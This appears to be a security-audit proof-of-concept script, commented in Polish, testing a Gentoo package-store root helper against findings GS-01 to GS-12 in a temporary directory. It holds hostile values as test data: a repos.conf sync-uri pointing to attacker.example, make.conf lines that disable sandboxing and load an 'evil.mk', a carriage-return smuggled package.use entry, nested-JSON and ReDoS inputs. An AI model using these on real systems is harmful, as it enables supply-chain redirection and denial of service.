"""Dowody do GS-01, GS-05, GS-06, GS-10 i GS-12 — wszystko na katalogu tymczasowym.

UWAGA: poprawki są już w tej gałęzi, więc skrypt pokazuje dziś **odmowy**, a nie
luki. Każda sekcja mówi, co robiła przed poprawką i co robi teraz; żeby zobaczyć
oryginalne zachowanie, uruchom go na `9b6ba1d` (commit sprzed audytu).

Ten skrypt niczego nie instaluje, nie woła pkexec ani sudo i nie dotyka /etc.
Działa dokładnie tak, jak tests/test_helper.py: importuje moduł helpera i podmienia
po imporcie stałą CONFIG_ROOT — czego zainstalowany program nie umie zrobić.

    python3 security-review/poc/poc_helper.py

Uwaga: część 2 (ReDoS) celowo zatrzymuje się na 28 znakach wejścia. Przy 40 znakach
ten sam wzorzec liczyłby się godzinami, co jest właśnie tym, co dowodzi tezy.
"""

from __future__ import annotations

import io
import json
import sys
import tempfile
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from gentstore.helper import gentstore_helper as helper  # noqa: E402

tmp = Path(tempfile.mkdtemp()).resolve()
root = tmp / "etc" / "portage"
(root / "repos.conf").mkdir(parents=True)
helper.CONFIG_ROOT = root
helper.BACKUP_PARENT = tmp / "etc"


def call(op: str, **fields) -> dict:
    out = io.StringIO()
    helper.main(io.StringIO(json.dumps({"op": op, **fields})), out)
    return json.loads(out.getvalue())


print("=== GS-01 · przedtem: write_file sprawdzał ścieżkę, nie treść ===")
payload = (
    "[gentoo]\n"
    "location = /var/db/repos/gentoo\n"
    "sync-type = git\n"
    "sync-uri = https://attacker.example/tree.git\n"
    "auto-sync = yes\n"
)
answer = call(
    "write_file",
    path=str(root / "repos.conf" / "zzz-override.conf"),
    content=payload,
    expect=None,
)
print("  odpowiedź helpera:", answer.get("code", "ok"), "-", answer.get("bytes"), "bajtów")

import configparser  # noqa: E402  — tak samo scala portage.repository.config.RepoConfigLoader

(root / "repos.conf" / "gentoo.conf").write_text(
    "[gentoo]\nlocation = /var/db/repos/gentoo\nsync-type = rsync\n"
    "sync-uri = rsync://rsync.gentoo.org/gentoo-portage\n",
    encoding="utf-8",
)
parser = configparser.ConfigParser()
parser.read(sorted(str(f) for f in (root / "repos.conf").iterdir()))
print("  gdyby plik powstał, sync-uri repozytorium gentoo brzmiałoby:",
      parser["gentoo"]["sync-uri"])

print()
print("=== GS-06 · które wartości make.conf helper przyjmuje (przedtem: wszystkie) ===")
for line in (
    'FEATURES="-sandbox -usersandbox -network-sandbox -userpriv -ipc-sandbox"',
    'FEATURES="-strict -webrsync-gpg"',
    'MAKEOPTS="-j1 -f/home/janek/evil.mk"',
    'EMERGE_DEFAULT_OPTS="--root=/tmp/elsewhere"',
    'USE="x" # and a comment',
    'PORTAGE_BASHRC="/tmp/x"',
):
    try:
        helper._check_make_conf_line(line)
        print("  PRZYJĘTA :", line)
    except helper.HelperError as exc:
        print("  odrzucona:", line, "->", exc.code)

print()
print("=== GS-10 · przedtem: \\r przechodził jako jedna linia, a Portage czytał dwa wpisy ===")
package_use = root / "package.use"
package_use.write_text("media-video/mpv vulkan\n", encoding="utf-8")
smuggled = "app-x/y flag\rsys-apps/portage -rsync-verify"
first = call("append_line", path=str(package_use), line=smuggled)
print("  pierwsze append:", first.get("code", "ok"))
print("  bajty w pliku  :", package_use.read_bytes())
print("  helper._lines():", helper._lines(package_use.read_bytes().decode()))
print(
    "  drugie append tej samej linii zmieniło plik?",
    call("append_line", path=str(package_use), line=smuggled).get("changed"),
    "(obietnica z Docs §4: identycznej linii nie duplikujemy)",
)

print()
print("=== GS-10b · czy replace_line zostawia resztę pliku bajt w bajt ===")
make_conf = root / "make.conf"
before = b'# notatka\n\nUSE="X"\n\n# zachowaj ten komentarz\nMAKEOPTS="-j4"\n'
make_conf.write_bytes(before)
call(
    "replace_line",
    path=str(make_conf),
    line='USE="X wayland"',
    match_kind="assignment",
    match_literal="USE",
)
after = make_conf.read_bytes()
print("  przed:", before)
print("  po   :", after)
print("  zmieniła się tylko linia USE:",
      after == before.replace(b'USE="X"', b'USE="X wayland"'))

print()
print("=== GS-12 · przedtem: zagnieżdżony JSON łamał kontrakt „zawsze jedna odpowiedź JSON” ===")
out = io.StringIO()
try:
    helper.main(io.StringIO("[" * 200_000 + "]" * 200_000), out)
    print("  odpowiedź:", out.getvalue().strip()[:120])
except BaseException as exc:  # noqa: BLE001 — o to właśnie chodzi
    print("  NIEZŁAPANY", type(exc).__name__, "— brak jakiejkolwiek odpowiedzi JSON")

print()
print("=== GS-05 · regex z żądania nie jest już kompilowany ===")
package_use.write_text("a" * 200 + "b\n", encoding="utf-8")
started = time.monotonic()
answer = call("replace_line", path=str(package_use), line="x/y flag", match="^(a+)+$")
elapsed = time.monotonic() - started
print(f"  stary ładunek '^(a+)+$' na 200 znakach -> {answer.get('code')} w {elapsed:.2f} s")
print("  komunikat:", answer.get("error", "")[:78])
print("  (przed poprawką ten sam wzorzec na 28 znakach liczył się 10 s,")
print("   a na 60 nie kończył się nigdy — w procesie roota, którego użytkownik nie ubije)")
